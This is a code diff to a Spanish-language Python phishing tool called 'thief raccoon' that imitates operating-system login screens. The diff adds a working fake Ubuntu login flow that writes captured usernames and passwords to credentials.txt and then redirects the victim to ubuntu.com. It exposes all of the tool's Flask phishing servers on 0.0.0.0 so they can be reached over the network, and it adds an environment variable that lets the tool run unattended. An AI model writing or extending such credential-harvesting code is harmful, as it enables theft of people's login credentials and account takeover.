@@ -30,6 +30,7 @@ thief raccoon - Herramienta para Phishing de inicio de sesion
     print(banner)
 
 def display_menu():
+    MACHINE=os.getenv('MACHINE')
     menu = f"""
 Seleccione el sistema operativo para el phishing:
 {Fore.GREEN}1. Windows 10
@@ -40,7 +41,11 @@ Seleccione el sistema operativo para el phishing:
 {Fore.RED}6. Ubuntu Server
 {Fore.WHITE}7. macOS
 {Style.RESET_ALL}Ingrese el número de su elección: """
-    choice = input(menu)
+    if MACHINE is None or MACHINE == "":
+        choice = input(menu)
+    else:
+        choice = MACHINE
+
     return choice
 
 def phishing_windows_11():
@@ -64,7 +69,7 @@ def phishing_windows_11():
             f.write(f'Username: {username}, Password: {password}\n')
         return redirect('https://www.microsoft.com/en-us/windows')
 
-    app.run(port=5000)
+    app.run(host='0.0.0.0', port=5000)
 
 def phishing_windows_10():
     app = Flask(__name__)
@@ -87,7 +92,7 @@ def phishing_windows_10():
             f.write(f'Username: {username}, Password: {password}\n')
         return redirect('https://www.microsoft.com/en-us/windows')
 
-    app.run(port=5000)
+    app.run(host='0.0.0.0', port=5000)
 
 def phishing_windows_xp():
     print("Próximamente, phishing para Windows XP")
@@ -96,7 +101,27 @@ def phishing_windows_server():
     print("Próximamente, phishing para Windows Server")
 
 def phishing_ubuntu():
-    print("Próximamente, phishing para Ubuntu")
+    app = Flask(__name__)
+
+    @app.route('/')
+    def index():
+        return render_template('ubuntu.html')
+
+    @app.route('/username', methods=['POST'])
+    def username():
+        username = request.form['username']
+        return render_template('passwordUbu.html', username=username)
+
+    @app.route('/login', methods=['POST'])
+    def login():
+        username = request.form['username']
+        password = request.form['password']
+        # Guardar los datos en un archivo
+        with open('credentials.txt', 'a') as f:
+            f.write(f'Username: {username}, Password: {password}\n')
+        return redirect('https://ubuntu.com/')
+
+    app.run(host='0.0.0.0', port=5000)
 
 def phishing_ubuntu_server():
     print("Próximamente, phishing para Ubuntu Server")
